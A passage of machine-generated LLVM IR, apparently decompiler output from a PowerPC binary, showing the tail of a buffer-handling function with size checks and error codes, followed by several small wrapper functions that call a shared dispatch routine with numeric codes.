  %v1_10007c30 = inttoptr i32 %v0_10007c30 to i32*
  %v2_10007c30 = load i32, i32* %v1_10007c30, align 4
  store i32 %v2_10007c30, i32* %r0.global-to-local, align 4
  %v3_10007c34 = icmp eq i32 %v2_10007c30, 2
  br i1 %v3_10007c34, label %dec_label_pc_10007c3c, label %dec_label_pc_10007ed4

dec_label_pc_10007c3c:                            ; preds = %dec_label_pc_10007c30, %dec_label_pc_10007c20, %dec_label_pc_10007c14
  %v0_10007c3c = load i32, i32* @r30, align 4
  %v1_10007c3c = sub i32 0, %v0_10007c3c
  store i32 %v1_10007c3c, i32* %r0.global-to-local, align 4
  %v0_10007c40 = load i32, i32* @r27, align 4
  %v1_10007c40 = load i32, i32* @r28, align 4
  %v2_10007c40 = inttoptr i32 %v1_10007c40 to i32*
  store i32 %v0_10007c40, i32* %v2_10007c40, align 4
  %v0_10007c44 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007c44 = urem i32 %v0_10007c44, 4
  store i32 %v1_10007c44, i32* %r0.global-to-local, align 4
  %v3_10007c44 = icmp eq i32 %v1_10007c44, 0
  %v0_10007c5c.pre = load i32, i32* @r29, align 4
  br i1 %v3_10007c44, label %dec_label_pc_10007c5c, label %dec_label_pc_10007c4c

dec_label_pc_10007c4c:                            ; preds = %dec_label_pc_10007c3c
  %v2_10007c4c = icmp ult i32 %v0_10007c5c.pre, %v1_10007c44
  br i1 %v2_10007c4c, label %dec_label_pc_10007ed0, label %dec_label_pc_10007c54

dec_label_pc_10007c54:                            ; preds = %dec_label_pc_10007c4c
  %v2_10007c54 = sub i32 %v0_10007c5c.pre, %v1_10007c44
  store i32 %v2_10007c54, i32* @r29, align 4
  %v0_10007c58 = load i32, i32* @r30, align 4
  %v2_10007c58 = add i32 %v0_10007c58, %v1_10007c44
  store i32 %v2_10007c58, i32* @r30, align 4
  br label %dec_label_pc_10007c5c

dec_label_pc_10007c5c:                            ; preds = %dec_label_pc_10007c3c, %dec_label_pc_10007c54
  %v0_10007c5c = phi i32 [ %v2_10007c54, %dec_label_pc_10007c54 ], [ %v0_10007c5c.pre, %dec_label_pc_10007c3c ]
  %v1_10007c64 = load i32, i32* @r24, align 4
  %v2_10007c64 = inttoptr i32 %v1_10007c64 to i32*
  store i32 -1, i32* %v2_10007c64, align 4
  %tmp29 = icmp ult i32 %v0_10007c5c, 4
  br i1 %tmp29, label %dec_label_pc_10007ed0, label %dec_label_pc_10007c6c

dec_label_pc_10007c6c:                            ; preds = %dec_label_pc_10007c5c
  %v0_10007c6c = load i32, i32* @r29, align 4
  %v1_10007c6c = add i32 %v0_10007c6c, -4
  store i32 %v1_10007c6c, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_10007c6c, 8
  br i1 %tmp30, label %dec_label_pc_10007ed0, label %dec_label_pc_10007c78

dec_label_pc_10007c78:                            ; preds = %dec_label_pc_10007c6c
  %v1_10007c78 = add i32 %v0_10007c6c, -12
  store i32 %v1_10007c78, i32* %r0.global-to-local, align 4
  %v0_10007c7c = load i32, i32* @r30, align 4
  %v1_10007c7c = add i32 %v0_10007c7c, 4
  store i32 %v1_10007c7c, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_10007c88 = inttoptr i32 %v1_10007c7c to i32*
  store i32 %v0_10007c7c, i32* %v3_10007c88, align 4
  %v0_10007c8c = load i32, i32* %r28.global-to-local, align 4
  %v1_10007c8c = load i32, i32* %r25.global-to-local, align 4
  %v2_10007c8c = add i32 %v1_10007c8c, 4
  %v3_10007c8c = inttoptr i32 %v2_10007c8c to i32*
  store i32 %v0_10007c8c, i32* %v3_10007c8c, align 4
  %tmp31 = icmp ult i32 %v1_10007c78, 32
  br i1 %tmp31, label %dec_label_pc_10007ed0, label %dec_label_pc_10007c94

dec_label_pc_10007c94:                            ; preds = %dec_label_pc_10007c78
  %v0_10007c94 = load i32, i32* @r29, align 4
  %v1_10007c94 = add i32 %v0_10007c94, -44
  %tmp32 = icmp ult i32 %v1_10007c94, 256
  br i1 %tmp32, label %dec_label_pc_10007ed0, label %dec_label_pc_10007ca0

dec_label_pc_10007ca0:                            ; preds = %dec_label_pc_10007c94
  %v0_10007ca0 = load i32, i32* @r30, align 4
  %v1_10007ca0 = add i32 %v0_10007ca0, 44
  store i32 %v1_10007ca0, i32* @r31, align 4
  %v0_10007ca4 = load i32, i32* @r23, align 4
  store i32 %v0_10007ca4, i32* @r4, align 4
  %v1_10007cac = add i32 %v0_10007ca0, 12
  store i32 %v1_10007cac, i32* %r21.global-to-local, align 4
  store i32 %v1_10007ca0, i32* %r3.global-to-local, align 4
  store i32 268467384, i32* @lr, align 4
  %v3_10007cb4 = call i32 @function_10007414(i32 %v1_10007ca0, i32 %v0_10007ca4, i32 %v1_10007c94)
  %v0_10007cb8 = load i32, i32* @r31, align 4
  %v1_10007cb8 = load i32, i32* @r30, align 4
  %v2_10007cb8 = add i32 %v1_10007cb8, 12
  %v3_10007cb8 = inttoptr i32 %v2_10007cb8 to i32*
  store i32 %v0_10007cb8, i32* %v3_10007cb8, align 4
  %v0_10007cbc = load i32, i32* %r28.global-to-local, align 4
  %v1_10007cbc = load i32, i32* %r21.global-to-local, align 4
  %v2_10007cbc = add i32 %v1_10007cbc, 4
  %v3_10007cbc = inttoptr i32 %v2_10007cbc to i32*
  store i32 %v0_10007cbc, i32* %v3_10007cbc, align 4
  %v0_10007cc0 = load i32, i32* @r23, align 4
  store i32 %v0_10007cc0, i32* %r3.global-to-local, align 4
  %v0_10007cc4 = load i32, i32* @r30, align 4
  store i32 %v0_10007cc4, i32* @r4, align 4
  store i32 268467404, i32* @lr, align 4
  %v2_10007cc8 = inttoptr i32 %v0_10007cc0 to i8*
  %v3_10007cc8 = call i32 @function_1000ad18(i8* %v2_10007cc8)
  store i32 %v3_10007cc8, i32* %r3.global-to-local, align 4
  store i32 %v3_10007cc8, i32* %r22.global-to-local, align 4
  %v3_10007ccc = icmp eq i32 %v3_10007cc8, 0
  br i1 %v3_10007ccc, label %dec_label_pc_10007d00, label %dec_label_pc_10007cd4

dec_label_pc_10007cd4:                            ; preds = %dec_label_pc_10007ca0
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10007cdc = load i32, i32* @r26, align 4
  %v2_10007cdc = add i32 %v1_10007cdc, 8
  %v3_10007cdc = inttoptr i32 %v2_10007cdc to i32*
  store i32 2, i32* %v3_10007cdc, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_10007ce4 = load i32, i32* @r31, align 4
  %v1_10007ce4 = load i32, i32* @r26, align 4
  %v2_10007ce4 = inttoptr i32 %v1_10007ce4 to i32*
  store i32 %v0_10007ce4, i32* %v2_10007ce4, align 4
  %v0_10007ce8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007ce8 = load i32, i32* @r26, align 4
  %v2_10007ce8 = add i32 %v1_10007ce8, 12
  %v3_10007ce8 = inttoptr i32 %v2_10007ce8 to i32*
  store i32 %v0_10007ce8, i32* %v3_10007ce8, align 4
  %v0_10007cec = load i32, i32* %r25.global-to-local, align 4
  %v1_10007cec = load i32, i32* @r26, align 4
  %v2_10007cec = add i32 %v1_10007cec, 16
  %v3_10007cec = inttoptr i32 %v2_10007cec to i32*
  store i32 %v0_10007cec, i32* %v3_10007cec, align 4
  %v0_10007cf0 = load i32, i32* %r21.global-to-local, align 4
  %v1_10007cf0 = load i32, i32* @r26, align 4
  %v2_10007cf0 = add i32 %v1_10007cf0, 4
  %v3_10007cf0 = inttoptr i32 %v2_10007cf0 to i32*
  store i32 %v0_10007cf0, i32* %v3_10007cf0, align 4
  %v0_10007cf4 = load i32, i32* @r26, align 4
  %v1_10007cf4 = load i32, i32* @r20, align 4
  %v2_10007cf4 = inttoptr i32 %v1_10007cf4 to i32*
  store i32 %v0_10007cf4, i32* %v2_10007cf4, align 4
  %v0_10007cf8 = load i32, i32* %r28.global-to-local, align 4
  %v1_10007cf8 = load i32, i32* @r24, align 4
  %v2_10007cf8 = inttoptr i32 %v1_10007cf8 to i32*
  store i32 %v0_10007cf8, i32* %v2_10007cf8, align 4
  br label %dec_label_pc_10007ed4

dec_label_pc_10007d00:                            ; preds = %dec_label_pc_10007ca0
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268467464, i32* @lr, align 4
  %v0_10007d04 = call i32 @function_1000b474()
  store i32 ptrtoint (i32* @global_var_100103e0.262 to i32), i32* %r29.global-to-local, align 4
  %v2_10007d0c = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_10007d0c, i32* %r28.global-to-local, align 4
  store i32 %v2_10007d0c, i32* @r3, align 4
  %v0_10007d20 = call i32 @function_100091fc()
  store i32 ptrtoint (i32* @global_var_100103e0.262 to i32), i32* %r3.global-to-local, align 4
  %v0_10007d28 = call i32 @function_100091f4()
  %v3_10007d30 = load i32, i32* @global_var_100104c8.263, align 4
  store i32 %v3_10007d30, i32* %r29.global-to-local, align 4
  store i32 %v2_10007d0c, i32* @r3, align 4
  %v0_10007d3c = call i32 @function_100091fc()
  %v0_10007d44 = load i32, i32* @r23, align 4
  store i32 %v0_10007d44, i32* %r3.global-to-local, align 4
  %v2_10007d54 = ptrtoint i32* %stack_var_-120 to i32
  %v2_10007d58 = ptrtoint i32* %stack_var_-100 to i32
  %v0_10007d5c = load i32, i32* %r22.global-to-local, align 4
  store i32 268467564, i32* @lr, align 4
  %v6_10007d68 = inttoptr i32 %v0_10007d44 to i8*
  %v7_10007d68 = call i32 @function_1000add8(i8* %v6_10007d68, i32 1, i32 %v3_10007d30, i32 ptrtoint (i32* @global_var_10012d4c.264 to i32), i32 %v2_10007d54, i32 %v2_10007d58)
  store i32 %v7_10007d68, i32* %r3.global-to-local, align 4
  %v1_10007d6c = icmp slt i32 %v7_10007d68, 0
  br i1 %v1_10007d6c, label %dec_label_pc_10007eb4, label %dec_label_pc_10007d74

dec_label_pc_10007d74:                            ; preds = %dec_label_pc_10007d00
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_10007d7c = add i32 %tmp19, 4
  %v2_10007d80 = mul i32 %v0_10007d5c, %v1_10007d7c
  %v1_10007d84 = add i32 %v2_10007d80, 256
  %v1_10007d88 = load i32, i32* @r27, align 4
  %v3_10007d88 = icmp ugt i32 %v1_10007d84, %v1_10007d88
  br i1 %v3_10007d88, label %dec_label_pc_10007d90, label %dec_label_pc_10007dac

dec_label_pc_10007d90:                            ; preds = %dec_label_pc_10007d74
  %v3_10007d90 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10007d90, i32* @r3, align 4
  store i32 268467608, i32* @lr, align 4
  %v0_10007d94 = call i32 @function_100081f4()
  %v3_10007d98 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10007d98, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007da0.265 to i32), i32* @lr, align 4
  %v0_10007d9c = call i32 @function_100081f4()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_10007da4 = load i32, i32* @r19, align 4
  %v1_10007da4 = load i32, i32* @r24, align 4
  %v2_10007da4 = inttoptr i32 %v1_10007da4 to i32*
  store i32 %v0_10007da4, i32* %v2_10007da4, align 4
  br label %dec_label_pc_10007ed4

dec_label_pc_10007dac:                            ; preds = %dec_label_pc_10007d74
  %v3_10007dac = icmp eq i32 %v0_10007d5c, 0
  br i1 %v3_10007dac, label %dec_label_pc_10007dac.dec_label_pc_10007e50_crit_edge, label %dec_label_pc_10007db4

dec_label_pc_10007dac.dec_label_pc_10007e50_crit_edge: ; preds = %dec_label_pc_10007dac
  %v0_10007e58.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007e50

dec_label_pc_10007db4:                            ; preds = %dec_label_pc_10007dac
  %v2_10007db4 = mul i32 %v0_10007d5c, %tmp19
  store i32 %v2_10007db4, i32* @r5, align 4
  %v0_10007db8 = load i32, i32* @r30, align 4
  %v1_10007db8 = add i32 %v0_10007db8, 36
  store i32 %v1_10007db8, i32* %r3.global-to-local, align 4
  %v0_10007dbc = load i32, i32* @r31, align 4
  store i32 268467652, i32* @lr, align 4
  %v2_10007dc0 = call i32 @function_1000a968(i32 %v1_10007db8, i32 %v0_10007dbc)
  store i32 %v2_10007dc0, i32* %r3.global-to-local, align 4
  store i32 %v2_10007db4, i32* %r0.global-to-local, align 4
  %v0_10007dd0 = load i32, i32* @r30, align 4
  %v1_10007dd0 = load i32, i32* @r31, align 4
  %v3_10007dd0 = add i32 %v1_10007dd0, %v2_10007db4
  %v4_10007dd0 = inttoptr i32 %v3_10007dd0 to i32*
  store i32 %v0_10007dd0, i32* %v4_10007dd0, align 4
  %v0_10007dd4 = load i32, i32* @r31, align 4
  %v1_10007dd4 = load i32, i32* %r0.global-to-local, align 4
  %v2_10007dd4 = add i32 %v1_10007dd4, %v0_10007dd4
  store i32 %v2_10007dd4, i32* @r25, align 4
  %v1_10007ddc = add i32 %v0_10007d5c, -1
  store i32 %v1_10007ddc, i32* %r11.global-to-local, align 4
  %v1_10007de0 = add i32 %v0_10007d5c, 1
  %v2_10007de4 = icmp sgt i32 %v1_10007ddc, -1
  store i32 %v1_10007de0, i32* %ctr.global-to-local, align 4
  br i1 %v2_10007de4, label %dec_label_pc_10007e14.preheader, label %dec_label_pc_10007df0

dec_label_pc_10007df0:                            ; preds = %dec_label_pc_10007db4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007e14.preheader

dec_label_pc_10007e14.preheader:                  ; preds = %dec_label_pc_10007df0, %dec_label_pc_10007db4
  %v0_10007e1c6 = phi i32 [ 1, %dec_label_pc_10007df0 ], [ %v1_10007de0, %dec_label_pc_10007db4 ]
  %v1_10007e143 = mul i32 %v1_10007ddc, 4
  store i32 %v1_10007e143, i32* %r0.global-to-local, align 4
  %v2_10007e185 = add i32 %v2_10007dd4, %v1_10007e143
  %v1_10007e1c7 = add i32 %v0_10007e1c6, -1
  store i32 %v1_10007e1c7, i32* %ctr.global-to-local, align 4
  %v2_10007e1c8 = icmp eq i32 %v1_10007e1c7, 0
  br i1 %v2_10007e1c8, label %dec_label_pc_10007e20, label %dec_label_pc_10007dfc

dec_label_pc_10007dfc:                            ; preds = %dec_label_pc_10007e14.preheader, %dec_label_pc_10007dfc.dec_label_pc_10007dfc_crit_edge
  %v1_10007e10 = phi i32 [ %v2_10007e18, %dec_label_pc_10007dfc.dec_label_pc_10007dfc_crit_edge ], [ %v2_10007e185, %dec_label_pc_10007e14.preheader ]
  %v0_10007e08 = phi i32 [ %v0_10007e08.pre, %dec_label_pc_10007dfc.dec_label_pc_10007dfc_crit_edge ], [ %v0_10007dd4, %dec_label_pc_10007e14.preheader ]
  %v0_10007e00 = phi i32 [ %v0_10007e14, %dec_label_pc_10007dfc.dec_label_pc_10007dfc_crit_edge ], [ %v1_10007ddc, %dec_label_pc_10007e14.preheader ]
  %v2_10007e00 = mul i32 %v0_10007e00, %tmp19
  %v1_10007e04 = add i32 %v0_10007e00, -1
  store i32 %v1_10007e04, i32* %r11.global-to-local, align 4
  %v2_10007e08 = add i32 %v0_10007e08, -8
  %v1_10007e0c = add i32 %v2_10007e08, %v2_10007e00
  %v2_10007e10 = add i32 %v1_10007e10, 4
  %v3_10007e10 = inttoptr i32 %v2_10007e10 to i32*
  store i32 %v1_10007e0c, i32* %v3_10007e10, align 4
  %v0_10007e14 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007e14 = mul i32 %v0_10007e14, 4
  store i32 %v1_10007e14, i32* %r0.global-to-local, align 4
  %v1_10007e18 = load i32, i32* @r25, align 4
  %v0_10007e1c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007e1c = add i32 %v0_10007e1c, -1
  store i32 %v1_10007e1c, i32* %ctr.global-to-local, align 4
  %v2_10007e1c = icmp eq i32 %v1_10007e1c, 0
  br i1 %v2_10007e1c, label %dec_label_pc_10007e20, label %dec_label_pc_10007dfc.dec_label_pc_10007dfc_crit_edge

dec_label_pc_10007dfc.dec_label_pc_10007dfc_crit_edge: ; preds = %dec_label_pc_10007dfc
  %v2_10007e18 = add i32 %v1_10007e18, %v1_10007e14
  %v0_10007e08.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007dfc

dec_label_pc_10007e20:                            ; preds = %dec_label_pc_10007dfc, %dec_label_pc_10007e14.preheader
  %v1_10007e2c = phi i32 [ %v2_10007dd4, %dec_label_pc_10007e14.preheader ], [ %v1_10007e18, %dec_label_pc_10007dfc ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10007e28 = mul i32 %v0_10007d5c, 4
  %v2_10007e2c = add i32 %v1_10007e28, 4
  %v2_10007e30 = add i32 %v2_10007e2c, %v1_10007e2c
  %v3_10007e30 = inttoptr i32 %v2_10007e30 to i32*
  store i32 0, i32* %v3_10007e30, align 4
  %v0_10007e3c = load i32, i32* @r25, align 4
  %v2_10007e3c = add i32 %v0_10007e3c, %v1_10007e28
  store i32 %v2_10007e3c, i32* %r11.global-to-local, align 4
  %v1_10007e40 = load i32, i32* @r31, align 4
  %v2_10007e40 = sub i32 %v1_10007e40, %v2_10007e3c
  %v1_10007e44 = add i32 %v2_10007e3c, 8
  store i32 %v1_10007e44, i32* @r31, align 4
  %v0_10007e48 = load i32, i32* @r27, align 4
  %v2_10007e48 = add i32 %v0_10007e48, %v2_10007e40
  %v1_10007e4c = add i32 %v2_10007e48, -8
  br label %dec_label_pc_10007e50

dec_label_pc_10007e50:                            ; preds = %dec_label_pc_10007dac.dec_label_pc_10007e50_crit_edge, %dec_label_pc_10007e20
  %v0_10007e58 = phi i32 [ %v0_10007e58.pre, %dec_label_pc_10007dac.dec_label_pc_10007e50_crit_edge ], [ %v1_10007e44, %dec_label_pc_10007e20 ]
  %v0_10007e54 = phi i32 [ %v1_10007d88, %dec_label_pc_10007dac.dec_label_pc_10007e50_crit_edge ], [ %v1_10007e4c, %dec_label_pc_10007e20 ]
  %v3_10007e50 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10007e50, i32* @r4, align 4
  store i32 %v0_10007e58, i32* %r3.global-to-local, align 4
  store i32 268467808, i32* @lr, align 4
  %v3_10007e5c = call i32 @function_10007414(i32 %v0_10007e58, i32 %v3_10007e50, i32 %v0_10007e54)
  %v3_10007e60 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10007e60, i32* @r3, align 4
  store i32 268467816, i32* @lr, align 4
  %v0_10007e64 = call i32 @function_100081f4()
  store i32 %v0_10007e64, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_10007e6c = icmp eq i32 %tmp18, 1
  br i1 %v3_10007e6c, label %dec_label_pc_10007e74, label %dec_label_pc_10007ebc

dec_label_pc_10007e74:                            ; preds = %dec_label_pc_10007e50
  store i32 4, i32* @r5, align 4
  %v0_10007e7c = load i32, i32* @r30, align 4
  store i32 %v0_10007e7c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10007e84.266 to i32), i32* @lr, align 4
  %v0_10007e80 = call i32 @function_10007104()
  %v1_10007e88 = load i32, i32* @r26, align 4
  %v2_10007e88 = add i32 %v1_10007e88, 8
  %v3_10007e88 = inttoptr i32 %v2_10007e88 to i32*
  store i32 2, i32* %v3_10007e88, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10007e90 = load i32, i32* @r26, align 4
  %v2_10007e90 = add i32 %v1_10007e90, 12
  %v3_10007e90 = inttoptr i32 %v2_10007e90 to i32*
  store i32 4, i32* %v3_10007e90, align 4
  %v0_10007e94 = load i32, i32* @r31, align 4
  %v1_10007e94 = load i32, i32* @r26, align 4
  %v2_10007e94 = inttoptr i32 %v1_10007e94 to i32*
  store i32 %v0_10007e94, i32* %v2_10007e94, align 4
  %v0_10007e98 = load i32, i32* @r25, align 4
  %v1_10007e98 = load i32, i32* @r26, align 4
  %v2_10007e98 = add i32 %v1_10007e98, 16
  %v3_10007e98 = inttoptr i32 %v2_10007e98 to i32*
  store i32 %v0_10007e98, i32* %v3_10007e98, align 4
  %v0_10007e9c = load i32, i32* @r21, align 4
  %v1_10007e9c = load i32, i32* @r26, align 4
  %v2_10007e9c = add i32 %v1_10007e9c, 4
  %v3_10007e9c = inttoptr i32 %v2_10007e9c to i32*
  store i32 %v0_10007e9c, i32* %v3_10007e9c, align 4
  %v3_10007ea0 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10007ea0, i32* @r3, align 4
  store i32 268467880, i32* @lr, align 4
  %v0_10007ea4 = call i32 @function_100081f4()
  store i32 %v0_10007ea4, i32* %r3.global-to-local, align 4
  %v0_10007ea8 = load i32, i32* @r26, align 4
  %v1_10007ea8 = load i32, i32* @r20, align 4
  %v2_10007ea8 = inttoptr i32 %v1_10007ea8 to i32*
  store i32 %v0_10007ea8, i32* %v2_10007ea8, align 4
  br label %dec_label_pc_10007eb4

dec_label_pc_10007eb4:                            ; preds = %dec_label_pc_10007ebc, %dec_label_pc_10007d00, %dec_label_pc_10007e74
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10007e74 ], [ 2, %dec_label_pc_10007d00 ], [ 2, %dec_label_pc_10007ebc ]
  %storemerge = phi i32 [ 0, %dec_label_pc_10007e74 ], [ 1, %dec_label_pc_10007d00 ], [ 1, %dec_label_pc_10007ebc ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_10007eb4 = load i32, i32* @r24, align 4
  %v2_10007eb4 = inttoptr i32 %v1_10007eb4 to i32*
  store i32 %storemerge, i32* %v2_10007eb4, align 4
  br label %dec_label_pc_10007ed4

dec_label_pc_10007ebc:                            ; preds = %dec_label_pc_10007e50
  %v3_10007ebc = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10007ebc, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007ec4.267 to i32), i32* @lr, align 4
  %v0_10007ec0 = call i32 @function_100081f4()
  store i32 %v0_10007ec0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007eb4

dec_label_pc_10007ed0:                            ; preds = %dec_label_pc_10007c94, %dec_label_pc_10007c78, %dec_label_pc_10007c6c, %dec_label_pc_10007c5c, %dec_label_pc_10007c4c
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007ed4

dec_label_pc_10007ed4:                            ; preds = %dec_label_pc_10007c30, %dec_label_pc_10007c28, %dec_label_pc_10007bdc, %dec_label_pc_10007ba4, %dec_label_pc_10007eb4, %dec_label_pc_10007d90, %dec_label_pc_10007cd4, %dec_label_pc_10007ed0
  store i32 %v0_10007ba8, i32* %r0.global-to-local, align 4
  %v0_10007ee4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10007ee4

; uselistorder directives
  uselistorder i32 %v0_10007e58, { 1, 0 }
  uselistorder i32 %v1_10007e28, { 1, 0 }
  uselistorder i32 %v1_10007e1c, { 1, 0 }
  uselistorder i32 %v1_10007e14, { 1, 0 }
  uselistorder i32 %v0_10007e00, { 1, 0 }
  uselistorder i32 %v1_10007e143, { 1, 0 }
  uselistorder i32 %v1_10007ddc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10007dd4, { 1, 0, 2 }
  uselistorder i32 %v0_10007d5c, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_10007ca0, { 1, 0, 2 }
  uselistorder i32 %v0_10007c5c.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10007c44, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 20, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 18, 19, 21, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 19, 8, 6, 7, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_10007ed4, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10007eb4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10007e50, { 1, 0 }
  uselistorder label %dec_label_pc_10007dfc, { 1, 0 }
  uselistorder label %dec_label_pc_10007c5c, { 1, 0 }
}

define i32 @function_10007ee8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007ee8:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007efc = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467980, i32* @lr, align 4
  %v2_10007f08 = call i32 @function_1000955c(i32 5, i32 %v2_10007efc)
  ret i32 %v2_10007f08

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007f1c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007f1c:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007f30 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268468032, i32* @lr, align 4
  %v2_10007f3c = call i32 @function_1000955c(i32 2, i32 %v2_10007f30)
  ret i32 %v2_10007f3c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007f50(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007f50:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007f64 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268468084, i32* @lr, align 4
  %v2_10007f70 = call i32 @function_1000955c(i32 3, i32 %v2_10007f64)
  ret i32 %v2_10007f70

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007f84(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007f84:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007f98 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268468132, i32* @lr, align 4
  %v2_10007fa0 = call i32 @function_1000955c(i32 4, i32 %v2_10007f98)
  ret i32 %v2_10007fa0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007fb4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007fb4:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007fc8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268468188, i32* @lr, align 4
  %v2_10007fd8 = call i32 @function_1000955c(i32 10, i32 %v2_10007fc8)
  ret i32 %v2_10007fd8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007fec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10007fec:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10008000 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268468252, i32* @lr, align 4
  %v2_10008018 = call i32 @function_1000955c(i32 11, i32 %v2_10008000)
  ret i32 %v2_10008018

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_1000802c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1000802c:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10008040 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268468312, i32* @lr, align 4
  %v2_10008054 = call i32 @function_1000955c(i32 14, i32 %v2_10008040)
  ret i32 %v2_10008054

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_10008068(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10008068:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000807c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268468364, i32* @lr, align 4
  %v2_10008088 = call i32 @function_1000955c(i32 1, i32 %v2_1000807c)
  ret i32 %v2_10008088

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000809c() local_unnamed_addr {
dec_label_pc_1000809c:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100080a4 = load i32, i32* @r3, align 4
  %v3_100080a4 = icmp eq i32 %v0_100080a4, 0
  br i1 %v3_100080a4, label %dec_label_pc_100080b4, label %dec_label_pc_100080b8

dec_label_pc_100080b4:                            ; preds = %dec_label_pc_1000809c
  br label %dec_label_pc_100080b8

dec_label_pc_100080b8:                            ; preds = %dec_label_pc_1000809c, %dec_label_pc_100080b4
  %v0_100080c8 = phi i32 [ 1, %dec_label_pc_100080b4 ], [ %v0_100080a4, %dec_label_pc_1000809c ]
  %v3_100080bc = icmp ugt i32 %v0_100080c8, -8
  br i1 %v3_100080bc, label %dec_label_pc_100081cc, label %dec_label_pc_100080c4

dec_label_pc_100080c4:                            ; preds = %dec_label_pc_100080b8
  %v1_100080c8 = add i32 %v0_100080c8, 4
  store i32 ptrtoint (i32* @global_var_10012af4.268 to i32), i32* @r29, align 4
